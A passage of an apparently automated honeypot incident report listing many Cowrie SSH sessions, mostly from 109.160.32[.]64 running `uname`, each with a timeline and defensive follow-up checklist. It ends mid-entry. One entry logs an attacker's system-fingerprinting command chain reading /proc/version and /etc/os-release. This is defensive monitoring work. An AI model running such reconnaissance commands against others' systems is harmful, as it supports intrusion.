**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12dee814c1c8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:14` | `cowrie.session.connect` |
| `2026-09-10 18:58:14` | `cowrie.client.version` |
| `2026-09-10 18:58:14` | `cowrie.client.kex` |
| `2026-09-10 18:58:16` | `cowrie.login.success` |
| `2026-09-10 18:58:18` | `cowrie.session.params` |
| `2026-09-10 18:58:18` | `cowrie.command.input` |
| `2026-09-10 18:58:18` | `cowrie.log.closed` |
| `2026-09-10 18:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e277a616b8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:20` | `cowrie.session.connect` |
| `2026-09-10 18:58:20` | `cowrie.client.version` |
| `2026-09-10 18:58:20` | `cowrie.client.kex` |
| `2026-09-10 18:58:23` | `cowrie.login.success` |
| `2026-09-10 18:58:25` | `cowrie.session.params` |
| `2026-09-10 18:58:25` | `cowrie.command.input` |
| `2026-09-10 18:58:26` | `cowrie.log.closed` |
| `2026-09-10 18:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6906a203ff37

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:25` | `cowrie.session.connect` |
| `2026-09-10 18:58:26` | `cowrie.client.version` |
| `2026-09-10 18:58:26` | `cowrie.client.kex` |
| `2026-09-10 18:58:30` | `cowrie.login.success` |
| `2026-09-10 18:58:33` | `cowrie.session.params` |
| `2026-09-10 18:58:33` | `cowrie.command.input` |
| `2026-09-10 18:58:33` | `cowrie.log.closed` |
| `2026-09-10 18:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b699c7c1ead0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:34` | `cowrie.session.connect` |
| `2026-09-10 18:58:34` | `cowrie.client.version` |
| `2026-09-10 18:58:34` | `cowrie.client.kex` |
| `2026-09-10 18:58:37` | `cowrie.login.success` |
| `2026-09-10 18:58:39` | `cowrie.session.params` |
| `2026-09-10 18:58:39` | `cowrie.command.input` |
| `2026-09-10 18:58:40` | `cowrie.log.closed` |
| `2026-09-10 18:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d6534004c6a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:41` | `cowrie.session.connect` |
| `2026-09-10 18:58:41` | `cowrie.client.version` |
| `2026-09-10 18:58:41` | `cowrie.client.kex` |
| `2026-09-10 18:58:43` | `cowrie.login.success` |
| `2026-09-10 18:58:44` | `cowrie.session.params` |
| `2026-09-10 18:58:44` | `cowrie.command.input` |
| `2026-09-10 18:58:45` | `cowrie.log.closed` |
| `2026-09-10 18:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f062593de51

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:48` | `cowrie.session.connect` |
| `2026-09-10 18:58:48` | `cowrie.client.version` |
| `2026-09-10 18:58:48` | `cowrie.client.kex` |
| `2026-09-10 18:58:49` | `cowrie.login.success` |
| `2026-09-10 18:58:51` | `cowrie.session.params` |
| `2026-09-10 18:58:51` | `cowrie.command.input` |
| `2026-09-10 18:58:52` | `cowrie.log.closed` |
| `2026-09-10 18:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5995cee2e243

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:58 |
| **Last Seen** | 2026-09-10 18:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:58:55` | `cowrie.session.connect` |
| `2026-09-10 18:58:55` | `cowrie.client.version` |
| `2026-09-10 18:58:55` | `cowrie.client.kex` |
| `2026-09-10 18:58:56` | `cowrie.login.success` |
| `2026-09-10 18:58:58` | `cowrie.session.params` |
| `2026-09-10 18:58:58` | `cowrie.command.input` |
| `2026-09-10 18:58:58` | `cowrie.log.closed` |
| `2026-09-10 18:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e56d9f907b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:01` | `cowrie.session.connect` |
| `2026-09-10 18:59:02` | `cowrie.client.version` |
| `2026-09-10 18:59:02` | `cowrie.client.kex` |
| `2026-09-10 18:59:04` | `cowrie.login.success` |
| `2026-09-10 18:59:06` | `cowrie.session.params` |
| `2026-09-10 18:59:06` | `cowrie.command.input` |
| `2026-09-10 18:59:06` | `cowrie.log.closed` |
| `2026-09-10 18:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca8a802a1b4b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:08` | `cowrie.session.connect` |
| `2026-09-10 18:59:08` | `cowrie.client.version` |
| `2026-09-10 18:59:08` | `cowrie.client.kex` |
| `2026-09-10 18:59:11` | `cowrie.login.success` |
| `2026-09-10 18:59:12` | `cowrie.session.params` |
| `2026-09-10 18:59:12` | `cowrie.command.input` |
| `2026-09-10 18:59:13` | `cowrie.log.closed` |
| `2026-09-10 18:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c2369d8e934

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:15` | `cowrie.session.connect` |
| `2026-09-10 18:59:15` | `cowrie.client.version` |
| `2026-09-10 18:59:15` | `cowrie.client.kex` |
| `2026-09-10 18:59:17` | `cowrie.login.success` |
| `2026-09-10 18:59:18` | `cowrie.session.params` |
| `2026-09-10 18:59:18` | `cowrie.command.input` |
| `2026-09-10 18:59:19` | `cowrie.log.closed` |
| `2026-09-10 18:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95160ec591ba

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:22` | `cowrie.session.connect` |
| `2026-09-10 18:59:22` | `cowrie.client.version` |
| `2026-09-10 18:59:22` | `cowrie.client.kex` |
| `2026-09-10 18:59:24` | `cowrie.login.success` |
| `2026-09-10 18:59:26` | `cowrie.session.params` |
| `2026-09-10 18:59:26` | `cowrie.command.input` |
| `2026-09-10 18:59:27` | `cowrie.log.closed` |
| `2026-09-10 18:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b781cd37eff

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:28` | `cowrie.session.connect` |
| `2026-09-10 18:59:29` | `cowrie.client.version` |
| `2026-09-10 18:59:29` | `cowrie.client.kex` |
| `2026-09-10 18:59:32` | `cowrie.login.success` |
| `2026-09-10 18:59:34` | `cowrie.session.params` |
| `2026-09-10 18:59:34` | `cowrie.command.input` |
| `2026-09-10 18:59:35` | `cowrie.log.closed` |
| `2026-09-10 18:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cad0fc0ede34

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:34` | `cowrie.session.connect` |
| `2026-09-10 18:59:35` | `cowrie.client.version` |
| `2026-09-10 18:59:35` | `cowrie.client.kex` |
| `2026-09-10 18:59:40` | `cowrie.login.success` |
| `2026-09-10 18:59:42` | `cowrie.session.params` |
| `2026-09-10 18:59:42` | `cowrie.command.input` |
| `2026-09-10 18:59:43` | `cowrie.log.closed` |
| `2026-09-10 18:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c66e9052eb

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:41` | `cowrie.session.connect` |
| `2026-09-10 18:59:42` | `cowrie.client.version` |
| `2026-09-10 18:59:42` | `cowrie.client.kex` |
| `2026-09-10 18:59:44` | `cowrie.login.success` |
| `2026-09-10 18:59:46` | `cowrie.session.params` |
| `2026-09-10 18:59:46` | `cowrie.command.input` |
| `2026-09-10 18:59:47` | `cowrie.log.closed` |
| `2026-09-10 18:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667f8339400b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:47` | `cowrie.session.connect` |
| `2026-09-10 18:59:47` | `cowrie.client.version` |
| `2026-09-10 18:59:47` | `cowrie.client.kex` |
| `2026-09-10 18:59:48` | `cowrie.login.success` |
| `2026-09-10 18:59:49` | `cowrie.session.params` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.command.success` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.command.input` |
| `2026-09-10 18:59:49` | `cowrie.log.closed` |
| `2026-09-10 18:59:50` | `cowrie.session.params` |
| `2026-09-10 18:59:50` | `cowrie.command.input` |
| `2026-09-10 18:59:50` | `cowrie.log.closed` |
| `2026-09-10 18:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a459cbb66279

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:48` | `cowrie.session.connect` |
| `2026-09-10 18:59:49` | `cowrie.client.version` |
| `2026-09-10 18:59:49` | `cowrie.client.kex` |
| `2026-09-10 18:59:51` | `cowrie.login.success` |
| `2026-09-10 18:59:52` | `cowrie.session.params` |
| `2026-09-10 18:59:52` | `cowrie.command.input` |
| `2026-09-10 18:59:53` | `cowrie.log.closed` |
| `2026-09-10 18:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fabe2ed3ef11

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:59 |
| **Last Seen** | 2026-09-10 18:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:59:54` | `cowrie.session.connect` |
| `2026-09-10 18:59:55` | `cowrie.client.version` |
| `2026-09-10 18:59:55` | `cowrie.client.kex` |
| `2026-09-10 18:59:56` | `cowrie.login.success` |
| `2026-09-10 18:59:58` | `cowrie.session.params` |
| `2026-09-10 18:59:58` | `cowrie.command.input` |
| `2026-09-10 18:59:58` | `cowrie.log.closed` |
| `2026-09-10 18:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbf0e34599ec

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:01` | `cowrie.session.connect` |
| `2026-09-10 19:00:01` | `cowrie.client.version` |
| `2026-09-10 19:00:01` | `cowrie.client.kex` |
| `2026-09-10 19:00:01` | `cowrie.login.success` |
| `2026-09-10 19:00:02` | `cowrie.session.params` |
| `2026-09-10 19:00:02` | `cowrie.command.input` |
| `2026-09-10 19:00:02` | `cowrie.log.closed` |
| `2026-09-10 19:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb089746a7b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:06` | `cowrie.session.connect` |
| `2026-09-10 19:00:07` | `cowrie.client.version` |
| `2026-09-10 19:00:07` | `cowrie.client.kex` |
| `2026-09-10 19:00:09` | `cowrie.login.success` |
| `2026-09-10 19:00:10` | `cowrie.session.params` |
| `2026-09-10 19:00:10` | `cowrie.command.input` |
| `2026-09-10 19:00:11` | `cowrie.log.closed` |
| `2026-09-10 19:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9747f9930ae1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:13` | `cowrie.session.connect` |
| `2026-09-10 19:00:14` | `cowrie.client.version` |
| `2026-09-10 19:00:14` | `cowrie.client.kex` |
| `2026-09-10 19:00:17` | `cowrie.login.success` |
| `2026-09-10 19:00:19` | `cowrie.session.params` |
| `2026-09-10 19:00:19` | `cowrie.command.input` |
| `2026-09-10 19:00:19` | `cowrie.log.closed` |
| `2026-09-10 19:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91f30c6724ca

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:22` | `cowrie.session.connect` |
| `2026-09-10 19:00:22` | `cowrie.client.version` |
| `2026-09-10 19:00:22` | `cowrie.client.kex` |
| `2026-09-10 19:00:24` | `cowrie.login.success` |
| `2026-09-10 19:00:24` | `cowrie.session.params` |
| `2026-09-10 19:00:24` | `cowrie.command.input` |
| `2026-09-10 19:00:25` | `cowrie.log.closed` |
| `2026-09-10 19:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5188169a9afe

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:29` | `cowrie.session.connect` |
| `2026-09-10 19:00:30` | `cowrie.client.version` |
| `2026-09-10 19:00:30` | `cowrie.client.kex` |
| `2026-09-10 19:00:32` | `cowrie.login.success` |
| `2026-09-10 19:00:33` | `cowrie.session.params` |
| `2026-09-10 19:00:33` | `cowrie.command.input` |
| `2026-09-10 19:00:34` | `cowrie.log.closed` |
| `2026-09-10 19:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db45cfc876ea

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:37` | `cowrie.session.connect` |
| `2026-09-10 19:00:37` | `cowrie.client.version` |
| `2026-09-10 19:00:37` | `cowrie.client.kex` |
| `2026-09-10 19:00:38` | `cowrie.login.success` |
| `2026-09-10 19:00:39` | `cowrie.session.params` |
| `2026-09-10 19:00:39` | `cowrie.command.input` |
| `2026-09-10 19:00:40` | `cowrie.log.closed` |
| `2026-09-10 19:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f3fdaccbdb

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:00:43` | `cowrie.session.connect` |
| `2026-09-10 19:00:44` | `cowrie.client.version` |
| `2026-09-10 19:00:44` | `cowrie.client.kex` |
| `2026-09-10 19:00:48` | `cowrie.login.success` |
| `2026-09-10 19:00:51` | `cowrie.session.params` |
| `2026-09-10 19:00:51` | `cowrie.command.input` |
| `2026-09-10 19:00:53` | `cowrie.log.closed` |
| `2026-09-10 19:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e0bddf91583

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 19:00 |
| **Last Seen** | 2026-09-10 19:01 |
| **Session Duration** | 10s |
